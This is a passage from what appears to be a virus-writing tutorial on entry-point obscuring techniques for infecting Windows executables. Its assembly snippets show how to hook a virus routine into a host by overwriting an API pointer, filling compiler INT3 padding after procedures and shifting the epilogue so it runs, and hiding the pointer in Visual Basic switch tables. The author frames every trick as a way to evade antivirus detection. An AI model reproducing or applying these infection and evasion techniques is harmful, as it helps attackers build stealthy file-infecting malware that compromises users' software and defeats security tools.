<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">755730</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>Virus_Routine</div></li>
</ol>
<p>Don't forget at the end of virus you should LoadLibraryA the dll that he try to load and getProcAddress the API that he need and resave it again in the place 755730.</p>
<p>You can also search only for GetProcAddress and see what's the API it need, if known API try
to modify the getProcAddress and all its parameters (you will need a disassembler disassemble backward) and write above them</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> Virus_Routine</div>
<p>And surely some nops or some junk and the address of your virus will be totally hidden or you can do this</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> imm32<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> Virus_Routine<span style="color: #339933;">-</span>imm32<br/>
&nbsp;</div>
<p>This technique will be powerful as Delphi use this Technique many in the middle of the code and C++ use it for EncodePointer and DecodePointer so it's very useful and you can build <em>your virus</em> on it.</p>
<p>This article doesn't intend to only write some EPOs but to open your mind on think of your EPO and researching for new techniques.</p>
<p>Now let's jump to the next.</p>
<h2><a name="c4"></a>4. Static Blocks of Code EPO</h2>
<p>Now you will ask me a question: should we build our EPO on an API? Is there anything else?</p>
<p>I'll respond to you and say yes there's another ways to EPO. We can build our EPO on anything we know in the host. What you mean? I mean blocks of code you can find it in many applications with a static shape.</p>
<p>If you build a program in Delphi using VCL or in Visual basic just open a window and nothing else you will see this program take up to 250 kb or maybe more and most of them in code section. Do you ask this question for yourself: where all of these bytes spent? I'll tell you most of these bytes spent in static blocks of code do many things like initialization and loading routines and sometimes for security and so on.</p>
<p>We will try to use these blocks to obfuscate our Virus_Routine entry point or hide the first decryptor on them and many things like that.</p>
<p>Now let's begin our first idea.</p>
<h3><a name="c41"></a>4.1 Cavity EPO</h3>
<p>Everyone know cavity filling and its idea by Billy. We will not talk about this cavity but we will talk about another cavity by C++ the most famous language of spare places.</p>
<p>C++ some mes like wri ng at the end of code sec on some int3 to align the code sec on physical size it also write some int3 at the end of every procedure to align it to 10H something like this</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #adadad; font-style: italic;">00518252</span> 8B4C24 <span style="color: #ff0000;">08</span>&nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ECX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">SS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ESP</span><span style="color: #339933;">+</span><span style="color: #ff0000;">8</span><span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">00518256</span> 8B4424 <span style="color: #ff0000;">04</span>&nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">SS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ESP</span><span style="color: #339933;">+</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">0051825A</span> <span style="color: #ff0000;">56</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ESI</span><br/>
<span style="color: #adadad; font-style: italic;">0051825B</span> <span style="color: #ff0000;">66</span><span style="color: #339933;">:</span>8B11&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">DX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">WORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ECX</span><span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">0051825E</span> 8D70 <span style="color: #ff0000;">02</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">LEA</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ESI</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">+</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">00518261</span> <span style="color: #ff0000;">66</span><span style="color: #339933;">:</span><span style="color: #ff0000;">8910</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">WORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">DX</span><br/>
<span style="color: #adadad; font-style: italic;">00518264</span> <span style="color: #ff0000;">41</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">/</span><span style="color: #00007f; font-weight: bold;">INC</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ECX</span><br/>
<span style="color: #adadad; font-style: italic;">00518265</span> <span style="color: #ff0000;">41</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |INC&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ECX</span><br/>
<span style="color: #adadad; font-style: italic;">00518266</span> <span style="color: #ff0000;">66</span><span style="color: #339933;">:</span>85D2&nbsp; &nbsp; &nbsp; &nbsp; |TEST &nbsp; <span style="color: #46aa03; font-weight: bold;">DX</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">DX</span><br/>
<span style="color: #adadad; font-style: italic;">00518269</span> <span style="color: #ff0000;">74</span> 0A&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |JE &nbsp; &nbsp; SHORT uedit32<span style="color: #339933;">.</span>00518275<br/>
<span style="color: #adadad; font-style: italic;">0051826B</span> <span style="color: #ff0000;">66</span><span style="color: #339933;">:</span>8B11&nbsp; &nbsp; &nbsp; &nbsp; |MOV&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">DX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">WORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ECX</span><span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">0051826E</span> <span style="color: #ff0000;">66</span><span style="color: #339933;">:</span><span style="color: #ff0000;">8916</span>&nbsp; &nbsp; &nbsp; &nbsp; |MOV&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">WORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ESI</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">DX</span><br/>
<span style="color: #adadad; font-style: italic;">00518271</span> <span style="color: #ff0000;">46</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |INC&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ESI</span><br/>
<span style="color: #adadad; font-style: italic;">00518272</span> <span style="color: #ff0000;">46</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |INC&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ESI</span><br/>
<span style="color: #adadad; font-style: italic;">00518273</span> ^EB EF &nbsp; &nbsp; &nbsp; &nbsp; \<span style="color: #00007f; font-weight: bold;">JMP</span>&nbsp; &nbsp; SHORT uedit32<span style="color: #339933;">.</span>00518264<br/>
<span style="color: #adadad; font-style: italic;">00518275</span> 5E &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">POP</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ESI</span><br/>
<span style="color: #adadad; font-style: italic;">00518276</span> C3 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RETN<br/>
<span style="color: #adadad; font-style: italic;">00518277</span> CC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; INT3<br/>
<span style="color: #adadad; font-style: italic;">00518278</span> CC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; INT3<br/>
<span style="color: #adadad; font-style: italic;">00518279</span> CC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; INT3<br/>
<span style="color: #adadad; font-style: italic;">0051827A</span> CC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; INT3<br/>
<span style="color: #adadad; font-style: italic;">0051827B</span> CC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; INT3<br/>
<span style="color: #adadad; font-style: italic;">0051827C</span> CC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; INT3<br/>
<span style="color: #adadad; font-style: italic;">0051827D</span> CC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; INT3<br/>
<span style="color: #adadad; font-style: italic;">0051827E</span> CC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; INT3<br/>
<span style="color: #adadad; font-style: italic;">0051827F</span> CC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; INT3<br/>
&nbsp;</div>
<p>This is a procedure copied from UltraEdit. as you can see there are many int3 at the end of this procedure there are 9 int3</p>
<p>Imagine if we write a call at these cavity bytes any call will take 5 or maximum 6 bytes and there will be spare 3 bytes. Or we can write these two instruc ons to do more obfusca on</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span>Virus_Routine<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
&nbsp;</div>
<p>And that's better. But you will ask me how we will make this code run in the middle of the host. There's two ways to do that:</p>
<ol>
<li>By a normal jump (and you will need to write at these bytes another jump to return)</li>
<li>Or what I prefer is to shift the return of the procedure which we found these bytes after.</li>
</ol>
<p>Shift Leave/Ret or Mov esp,ebp/pop ebp/ret or any pop then Ret. Try to find the difference of the following code and the previous code we write</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #adadad; font-style: italic;">00518252</span> 8B4C24 <span style="color: #ff0000;">08</span>&nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ECX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">SS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ESP</span><span style="color: #339933;">+</span><span style="color: #ff0000;">8</span><span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">00518256</span> 8B4424 <span style="color: #ff0000;">04</span>&nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">SS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ESP</span><span style="color: #339933;">+</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">0051825A</span> <span style="color: #ff0000;">56</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ESI</span><br/>
<span style="color: #adadad; font-style: italic;">0051825B</span> <span style="color: #ff0000;">66</span><span style="color: #339933;">:</span>8B11&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">DX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">WORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ECX</span><span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">0051825E</span> 8D70 <span style="color: #ff0000;">02</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">LEA</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ESI</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">+</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">00518261</span> <span style="color: #ff0000;">66</span><span style="color: #339933;">:</span><span style="color: #ff0000;">8910</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">WORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">DX</span><br/>
<span style="color: #adadad; font-style: italic;">00518264</span> <span style="color: #ff0000;">41</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">/</span><span style="color: #00007f; font-weight: bold;">INC</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ECX</span><br/>
<span style="color: #adadad; font-style: italic;">00518265</span> <span style="color: #ff0000;">41</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |INC&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ECX</span><br/>
<span style="color: #adadad; font-style: italic;">00518266</span> <span style="color: #ff0000;">66</span><span style="color: #339933;">:</span>85D2&nbsp; &nbsp; &nbsp; &nbsp; |TEST &nbsp; <span style="color: #46aa03; font-weight: bold;">DX</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">DX</span><br/>
<span style="color: #adadad; font-style: italic;">00518269</span> <span style="color: #ff0000;">74</span> 0A&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |JE &nbsp; &nbsp; SHORT uedit32<span style="color: #339933;">.</span>00518275<br/>
<span style="color: #adadad; font-style: italic;">0051826B</span> <span style="color: #ff0000;">66</span><span style="color: #339933;">:</span>8B11&nbsp; &nbsp; &nbsp; &nbsp; |MOV&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">DX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">WORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ECX</span><span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">0051826E</span> <span style="color: #ff0000;">66</span><span style="color: #339933;">:</span><span style="color: #ff0000;">8916</span>&nbsp; &nbsp; &nbsp; &nbsp; |MOV&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">WORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ESI</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">DX</span><br/>
<span style="color: #adadad; font-style: italic;">00518271</span> <span style="color: #ff0000;">46</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |INC&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ESI</span><br/>
<span style="color: #adadad; font-style: italic;">00518272</span> <span style="color: #ff0000;">46</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |INC&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ESI</span><br/>
<span style="color: #adadad; font-style: italic;">00518273</span> ^EB EF &nbsp; &nbsp; &nbsp; &nbsp; \<span style="color: #00007f; font-weight: bold;">JMP</span>&nbsp; &nbsp; SHORT uedit32<span style="color: #339933;">.</span>00518264<br/>
<span style="color: #adadad; font-style: italic;">00518277</span> CC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; INT3<br/>
<span style="color: #adadad; font-style: italic;">00518278</span> CC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; INT3<br/>
<span style="color: #adadad; font-style: italic;">00518279</span> CC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; INT3<br/>
<span style="color: #adadad; font-style: italic;">0051827A</span> CC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; INT3<br/>
<span style="color: #adadad; font-style: italic;">0051827B</span> CC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; INT3<br/>
<span style="color: #adadad; font-style: italic;">0051827C</span> CC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; INT3<br/>
<span style="color: #adadad; font-style: italic;">0051827D</span> CC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; INT3<br/>
<span style="color: #adadad; font-style: italic;">0051827E</span> CC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; INT3<br/>
<span style="color: #adadad; font-style: italic;">0051827F</span> CC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; INT3<br/>
<span style="color: #adadad; font-style: italic;">00518275</span> 5E &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">POP</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ESI</span><br/>
<span style="color: #adadad; font-style: italic;">00518276</span> C3 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RETN<br/>
&nbsp;</div>
<p>If you recognize the difference I'm sure you understand me. We shift pop esi/retn after all cavity bytes to make them run at the end of the Proc</p>
<p>I think now you understand the idea. Now let's talk about how to use this idea for our Evil mind. These bytes are between 0 to 15 bytes. So that's mean we have 15 free bytes (more than Griyo that gives to us maximum 6 bytes) not only that but also this idea is an irreversible idea as you delete all marks that's could AV search for and reverse your idea. It's not like RegisterClassA idea as they can also search for the API and check if you use this trick or not but this no way to do like you do and this is the power of this trick.</p>
<p>Now we have 15 bytes so what we will do by them. We can write something like this:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span>imm32 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;6 bytes</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span>Virus_Routine<span style="color: #339933;">-</span>imm32 <span style="color: black; font-style: italic;">;6 bytes</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;3 bytes</span><br/>
&nbsp;</div>
<p>as you can see they are 15 bytes exactly and you obfuscate your pointer to the virus. Imagine how they will search for your virus EntryPoint they will need an emulator comes in handy with the searcher and it will take a much time to find the pointer.</p>
<p>But this is not only what we can do. We can use two Cavity places in row and make it more and more hard like this:</p>
<p>1st Cavity:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span>ptr32<span style="color: black;">&#93;</span><span style="color: #339933;">,</span>Virus_Routine <span style="color: black; font-style: italic;">;8 bytes</span></div>
<p>2nd Cavity:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span>ptr32<span style="color: black;">&#93;</span> &nbsp; <span style="color: black; font-style: italic;">;6 bytes</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;3 bytes</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; End_Epo &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;2 bytes</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;3 bytes</span><br/>
End_Epo<span style="color: #339933;">:</span><br/>
&nbsp;</div>
<p>So the call now away from the Virus_Routine Pointer.</p>
<p>Or you can do like this</p>
<p>First in the infection time write in ptr32 (in the host) a value like imm32 and in the cavity write</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span>ptr32<span style="color: black;">&#93;</span> &nbsp; <span style="color: black; font-style: italic;">;6 bytes</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span>Virus_Routine<span style="color: #339933;">-</span>imm32 <span style="color: black; font-style: italic;">;6 bytes</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;3 bytes</span><br/>
&nbsp;</div>
<p>Do whatever you want to do by these spare places and play with AV the cat &amp; rat game searching for your Virus_Routine Pointer.</p>
<p>Now let's jump to last obfuscation with Virus_Routine pointer and let's find our way in Visual Basic</p>
<h3><a name="c42"></a>4.2 Switches EPO</h3>
<p>As we say in the beginning we want to analysis the static code of every compiler trying to find a perfect place to hide our pointer to Virus_Routine and now we will take another compiler and jump to Visual basic.</p>
<p>This trick is not a better place than the previous places but I want to open your mind for researching and finding a good trick for your EPO. All of these EPOs are just examples of what you can find. This article is simply a tutorial of how to find an EPO and how to create your own idea on EPO. So this is just an example you will find the better.</p>
<p>If you write a piece of code in Visual basic I'm sure you hear about "Select case". It's a command in Visual basic like Switch in C++ and it's written like this:</p>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #8D38C9; font-weight: bold;">select</span> <span style="color: #8D38C9; font-weight: bold;">case</span> X<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">case</span> 1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">case</span> 2<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">case</span> 3<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">case</span> <span style="color: #8D38C9; font-weight: bold;">else</span><br/>
<span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">select</span><br/>
&nbsp;</div>
<p>this code converted into assembly like this</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">CMP</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Switch (cases 0..4)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">JA</span>&nbsp; &nbsp; &nbsp; pagebree<span style="color: #339933;">.</span>005DF2CE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">JMP</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span><span style="color: #339933;">+</span>5DF308<span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">005DF308</span> 005DF214 pagebree<span style="color: #339933;">.</span>005DF214<br/>
<span style="color: #adadad; font-style: italic;">005DF30C</span> 005DF22F pagebree<span style="color: #339933;">.</span>005DF22F<br/>
<span style="color: #adadad; font-style: italic;">005DF310</span> 005DF24A pagebree<span style="color: #339933;">.</span>005DF24A<br/>
<span style="color: #adadad; font-style: italic;">005DF314</span> 005DF265 pagebree<span style="color: #339933;">.</span>005DF265<br/>
<span style="color: #adadad; font-style: italic;">005DF318</span> 005DF28D pagebree<span style="color: #339933;">.</span>005DF28D<br/>
&nbsp;</div>
<p>Ollydbg can analysis this code and understand that it's switch. It simply write all pointers to all codes in select case in a list and jump to everyone depend the number of case it should run for like this:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">select case X<br/>
&nbsp; &nbsp; &nbsp; &nbsp; case <span style="color: #ff0000;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">JMP</span> <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span><span style="color: #339933;">+</span>5DF308<span style="color: black;">&#93;</span> <span style="color: black; font-style: italic;">; eax==1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; case <span style="color: #ff0000;">2</span><br/>
